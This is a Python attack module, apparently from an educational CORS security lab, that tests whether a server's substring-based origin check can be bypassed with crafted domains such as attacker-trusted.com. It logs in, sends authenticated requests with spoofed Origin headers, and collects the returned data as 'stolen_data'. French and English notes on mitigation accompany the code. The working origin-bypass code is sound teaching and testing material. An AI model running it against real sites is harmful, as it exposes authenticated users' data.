"""
Permissive filtering attack exploiting substring matching vulnerability.

This attack demonstrates how using substring matching for origin validation
allows attackers to bypass CORS protections with cleverly crafted domains.
"""

import asyncio
import httpx
from typing import Optional, Dict, Any, List
import json

from attacks.base_attack import BaseAttack
from attacks.models import AttackResult


class PermissiveAttack(BaseAttack):
    """
    Permissive filtering attack against CORS vulnerability.
    
    This attack exploits the misconfiguration where the server uses substring
    matching to validate origins instead of exact matching. For example, if
    the server checks if "trusted.com" is in the origin, attackers can use:
    - attacker-trusted.com
    - trusted.com.evil.com
    - trusted.com-phishing.net
    
    This completely bypasses the intended origin restrictions.
    
    Attributes:
        target_substring: The substring the server checks for (e.g., "trusted.com")
        test_credentials: Credentials to use for authentication
    """
    
    def __init__(
        self,
        target_url: str,
        target_substring: str = "trusted.com",
        test_credentials: Optional[Dict[str, str]] = None,
        max_rate: int = 5,
        demo_mode: bool = False,
        test_secure_only: bool = False
    ):
        """
        Initialize the permissive filtering attack.
        
        Args:
            target_url: Base URL of the target application
            target_substring: Substring the server checks for (default: "trusted.com")
            test_credentials: Dict with 'username' and 'password' keys
            max_rate: Maximum requests per second (default: 5)
            demo_mode: If True, simulate attack without making real HTTP requests
            test_secure_only: If True, only test the secure endpoint
        """
        super().__init__(target_url, max_rate)
        self.target_substring = target_substring
        self.test_credentials = test_credentials or {
            "username": "victim",
            "password": "victim123"
        }
        self.demo_mode = demo_mode
        self.test_secure_only = test_secure_only
        
        # Generate malicious origin variations
        self.malicious_origins = [
            f"http://attacker-{target_substring}",
            f"http://{target_substring}.evil.com",
            f"https://{target_substring}-phishing.net",
            f"http://fake{target_substring}.org",
            f"http://{target_substring}malicious.com",
            f"https://not{target_substring}.io",
            f"http://www.{target_substring}.attacker.com",
            f"http://{target_substring}",  # Legitimate-looking but missing protocol/subdomain
        ]
    
    async def authenticate(
        self,
        client: httpx.AsyncClient,
        origin: str
    ) -> Optional[str]:
        """
        Authenticate to the target application.
        
        Args:
            client: HTTP client to use
            origin: Origin header to use
        
        Returns:
            Session cookie value if successful, None otherwise
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.post(
                f"{self.target_url}/api/auth/login",
                json=self.test_credentials,
                headers={"Origin": origin}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                data = response.json()
                return data.get("session_id")
            
            return None
            
        except Exception as e:
            print(f"Authentication error with origin {origin}: {e}")
            return None
    
    async def test_origin(
        self,
        client: httpx.AsyncClient,
        origin: str,
        session_cookie: str
    ) -> tuple[bool, Optional[Dict[str, Any]], Dict[str, Any]]:
        """
        Test a specific origin against the vulnerable endpoint.
        
        Args:
            client: HTTP client to use
            origin: Origin to test
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (accepted, stolen_data, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            # Make request to vulnerable permissive endpoint
            response = await client.get(
                f"{self.target_url}/api/vuln/permissive",
                headers={"Origin": origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            # Check if origin was accepted (200 status and CORS header present)
            if response.status_code == 200:
                headers = dict(response.headers)
                acao = headers.get("access-control-allow-origin")
                accepted = acao == origin
                
                if accepted:
                    return True, response.json(), headers
                else:
                    return False, None, headers
            else:
                return False, None, dict(response.headers)
                
        except Exception as e:
            print(f"Error testing origin {origin}: {e}")
            return False, None, {}
    
    async def test_secure_endpoint(
        self,
        client: httpx.AsyncClient,
        origin: str,
        session_cookie: str
    ) -> tuple[bool, Dict[str, Any]]:
        """
        Test the secure endpoint to verify it rejects malicious origins.
        
        Args:
            client: HTTP client to use
            origin: Origin to test
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (rejected, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.get(
                f"{self.target_url}/api/sec/permissive",
                headers={"Origin": origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            headers = dict(response.headers)
            # Secure endpoint should reject by not setting ACAO or returning 403
            rejected = (
                response.status_code == 403 or
                headers.get("access-control-allow-origin") != origin
            )
            return rejected, headers
            
        except Exception as e:
            print(f"Error testing secure endpoint with origin {origin}: {e}")
            return False, {}
    
    async def execute(self) -> AttackResult:
        """
        Execute the permissive filtering attack.
        
        This method:
        1. Authenticates to the target application
        2. Tests multiple malicious origin variations
        3. Identifies which origins are accepted due to substring matching
        4. Steals sensitive data from accepted origins
        5. Tests secure endpoint to show proper validation
        
        Returns:
            AttackResult with attack execution details
        """
        # In demo mode, simulate the attack without making real requests
        if self.demo_mode:
            return self._execute_demo_mode(self.test_secure_only)
        
        request_details = []
        response_details = []
        stolen_data = {}
        vulnerable_endpoints = []
        accepted_origins = []
        rejected_origins = []
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Step 1: Authenticate with first malicious origin
            session_cookie = None
            for origin in self.malicious_origins:
                session_cookie = await self.authenticate(client, origin)
                if session_cookie:
                    break
            
            if not session_cookie:
                # Try with legitimate origin
                session_cookie = await self.authenticate(client, f"http://{self.target_substring}")
            
            if not session_cookie:
                return AttackResult(
                    attack_type="permissive_filtering",
                    success=False,
                    duration_seconds=self.get_duration(),
                    requests_sent=self.get_requests_sent(),
                    error="Authentication failed with all origins",
                    educational_notes="Could not authenticate to test the vulnerability."
                )
            
            # Step 2: Test each malicious origin
            for origin in self.malicious_origins:
                accepted, data, headers = await self.test_origin(client, origin, session_cookie)
                
                # Record request
                request_details.append({
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/permissive",
                    "headers": {"Origin": origin},
                    "cookies": {"session_id": "***"}
                })
                
                # Record response
                response_details.append({
                    "status": 200 if accepted else 403,
                    "headers": headers,
                    "cors_headers": {
                        "Access-Control-Allow-Origin": headers.get("access-control-allow-origin"),
                        "Access-Control-Allow-Credentials": headers.get("access-control-allow-credentials")
                    },
                    "origin_accepted": accepted,
                    "origin_tested": origin
                })
                
                if accepted:
                    accepted_origins.append(origin)
                    if data:
                        stolen_data[origin] = data
                else:
                    rejected_origins.append(origin)
            
            # Step 3: Test secure endpoint with one malicious origin
            if accepted_origins:
                test_origin = accepted_origins[0]
                secure_rejected, secure_headers = await self.test_secure_endpoint(
                    client, test_origin, session_cookie
                )
                
                request_details.append({
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/permissive",
                    "headers": {"Origin": test_origin},
                    "cookies": {"session_id": "***"}
                })
                
                response_details.append({
                    "status": 403 if secure_rejected else 200,
                    "headers": secure_headers,
                    "cors_headers": {
                        "Access-Control-Allow-Origin": secure_headers.get("access-control-allow-origin"),
                        "Access-Control-Allow-Credentials": secure_headers.get("access-control-allow-credentials")
                    },
                    "properly_rejected": secure_rejected,
                    "origin_tested": test_origin
                })
        
        # Determine success
        attack_success = len(accepted_origins) > 0
        
        if attack_success:
            vulnerable_endpoints.append("/api/vuln/permissive")
        
        # Add summary to stolen data
        if stolen_data:
            stolen_data["_summary"] = {
                "accepted_origins": accepted_origins,
                "rejected_origins": rejected_origins,
                "target_substring": self.target_substring
            }
        
        # Educational notes
        educational_notes = f"""
PERMISSIVE FILTERING VULNERABILITY

Vulnerability: Using substring matching for origin validation

The server checks if the origin contains "{self.target_substring}" using substring
matching instead of exact string comparison. This allows attackers to register
domains that contain the target substring and bypass CORS protections.

Malicious Origins Tested:
{chr(10).join(f"  - {origin} {'✓ ACCEPTED' if origin in accepted_origins else '✗ REJECTED'}" for origin in self.malicious_origins)}

Attack Scenario:
1. Server uses code like: if "trusted.com" in origin_header
2. Attacker registers domain: attacker-trusted.com
3. Attacker hosts malicious website on their domain
4. Victim visits attacker's site while logged into target
5. Malicious JavaScript makes authenticated requests
6. Server accepts the origin due to substring match
7. Attacker steals sensitive administrative data

Impact:
- Complete bypass of origin restrictions
- Trivial to exploit (just register a domain)
- Difficult to detect without code review
- Can affect multiple endpoints

Reference: MISC 99, §2.4

Mitigation:
- NEVER use substring matching for origin validation
- Use exact string matching including protocol and port
- Validate against a strict whitelist
- Consider using URL parsing libraries for proper validation

Vulnerable Code Pattern:
  if "trusted.com" in request_origin:  # WRONG!
      Access-Control-Allow-Origin: request_origin

Secure Code Pattern:
  allowed_origins = [
      "https://trusted.com",
      "https://app.trusted.com"
  ]
  if request_origin in allowed_origins:  # Exact match
      Access-Control-Allow-Origin: request_origin
      Access-Control-Allow-Credentials: true

Additional Security:
- Include protocol (http:// vs https://)
- Include port if non-standard
- Validate domain structure
- Use URL parsing to extract and validate components
        """.strip()
        
        return AttackResult(
            attack_type="permissive_filtering",
            success=attack_success,
            duration_seconds=self.get_duration(),
            requests_sent=self.get_requests_sent(),
            stolen_data=stolen_data if stolen_data else None,
            vulnerable_endpoints=vulnerable_endpoints,
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )
    
    def _execute_demo_mode(self, test_secure_only: bool = False) -> AttackResult:
        """Execute attack in demo mode (simulated)."""
        import time
        time.sleep(0.3)
        
        if test_secure_only:
            stolen_data = {
                "blocked": True,
                "reason": "L'endpoint sécurisé utilise une correspondance exacte",
                "status": 403
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/permissive",
                    "headers": {"Origin": f"http://attaquant-{self.target_substring}"},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint SÉCURISÉ avec domaine malveillant - Bloqué ✗"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/sec/permissive",
                    "type": "SÉCURISÉ",
                    "status": 403,
                    "headers": {
                        "content-type": "application/json"
                    },
                    "result": "✓ SÉCURISÉ - Utilise une correspondance exacte"
                }
            ]
            
            educational_notes = """
ENDPOINT SÉCURISÉ - PROTECTION CONTRE FILTRAGE PERMISSIF (MODE DÉMO)

Configuration Sécurisée : Correspondance exacte de l'origine

L'endpoint sécurisé utilise une correspondance exacte (==) au lieu d'une correspondance
de sous-chaîne (contains) pour valider les origines.

✓ PROTECTION ACTIVE :
   - Utilise une correspondance exacte (==)
   - Rejette les domaines malveillants (403)
   - Protège les données utilisateur

Référence : MISC 99, §2.4
            """.strip()
        else:
            stolen_data = {
                "user_data": {
                    "email": "victim@example.com",
                    "profile": "Données sensibles du profil utilisateur"
                }
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/permissive",
                    "headers": {"Origin": f"http://attaquant-{self.target_substring}"},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint VULNÉRABLE avec domaine malveillant - Succès ✓"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/vuln/permissive",
                    "type": "VULNÉRABLE",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": f"http://attaquant-{self.target_substring}",
                        "access-control-allow-credentials": "true"
                    },
                    "result": "✗ VULNÉRABLE - Accepte les domaines contenant la sous-chaîne"
                }
            ]
            
            educational_notes = """
VULNÉRABILITÉ DE FILTRAGE PERMISSIF (MODE DÉMO)

Vulnérabilité : Le serveur utilise une correspondance de sous-chaîne pour la validation d'origine

L'utilisation de correspondance de sous-chaîne permet aux attaquants de contourner les restrictions
d'origine avec des domaines astucieusement conçus comme attaquant-domaine-confiance.com.

✗ VULNÉRABILITÉ ACTIVE :
   - Utilise une correspondance de sous-chaîne (contains)
   - Accepte attaquant-trusted.com si "trusted.com" est dans la liste
   - Données utilisateur exposées

Impact :
- Contourne la liste blanche d'origines
- Permet le vol de données depuis des domaines malveillants
- Difficile à détecter

Référence : MISC 99, §2.4

Mitigation :
- Utiliser une correspondance exacte pour la validation d'origine
- Valider séparément le protocole, le domaine et le port

NOTE : Cette attaque a été exécutée en MODE DÉMO.
            """.strip()
        
        return AttackResult(
            attack_type="permissive_filtering",
            success=not test_secure_only,
            duration_seconds=0.3,
            requests_sent=1,
            stolen_data=stolen_data,
            vulnerable_endpoints=[] if test_secure_only else ["/api/vuln/permissive"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )


# CLI interface for standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        substring = sys.argv[2] if len(sys.argv) > 2 else "trusted.com"
        
        attack = PermissiveAttack(target_url=target, target_substring=substring)
        result = await attack.run()
        
        print("\n" + "="*70)
        print("ATTACK RESULTS")
        print("="*70)
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f} seconds")
        print(f"Requests Sent: {result.requests_sent}")
        
        if result.stolen_data and "_summary" in result.stolen_data:
            summary = result.stolen_data["_summary"]
            print(f"\nAccepted Origins: {len(summary['accepted_origins'])}")
            for origin in summary['accepted_origins']:
                print(f"  ✓ {origin}")
            
            print(f"\nRejected Origins: {len(summary['rejected_origins'])}")
            for origin in summary['rejected_origins']:
                print(f"  ✗ {origin}")
        
        if result.vulnerable_endpoints:
            print(f"\nVulnerable Endpoints:")
            for endpoint in result.vulnerable_endpoints:
                print(f"  - {endpoint}")
        
        if result.error:
            print(f"\nError: {result.error}")
        
        print(f"\n{result.educational_notes}")
    
    asyncio.run(main())
